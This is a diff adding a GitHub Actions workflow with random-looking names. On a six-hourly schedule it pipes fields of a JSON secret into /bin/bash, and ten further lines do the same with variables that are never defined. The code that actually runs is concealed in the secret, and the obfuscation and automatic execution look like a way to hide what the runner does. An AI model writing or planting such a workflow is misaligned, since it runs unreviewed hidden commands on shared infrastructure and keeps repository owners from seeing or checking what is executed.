@@ -1,0 +1,27 @@
+name: shengqiangsi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shengqiangsi
+        env:
+          hxse96: ${{ secrets.hxse96 }}
+        run: |
+          echo $hxse96 | jq -r .ou644 | /bin/bash
+          echo $tz0 | jq -r .f99597 | /bin/bash
+          echo $w131 | jq -r .lxal7012 | /bin/bash
+          echo $iit38 | jq -r .yavg69041 | /bin/bash
+          echo $juw3 | jq -r .bbnm65307 | /bin/bash
+          echo $j501 | jq -r .ubzfn561 | /bin/bash
+          echo $idajf42975 | jq -r .imw7322 | /bin/bash
+          echo $xk199 | jq -r .l59 | /bin/bash
+          echo $w7734 | jq -r .drnug048 | /bin/bash
+          echo $k80 | jq -r .qsvqu38590 | /bin/bash
+          echo $tjukb03 | jq -r .d04054 | /bin/bash
+
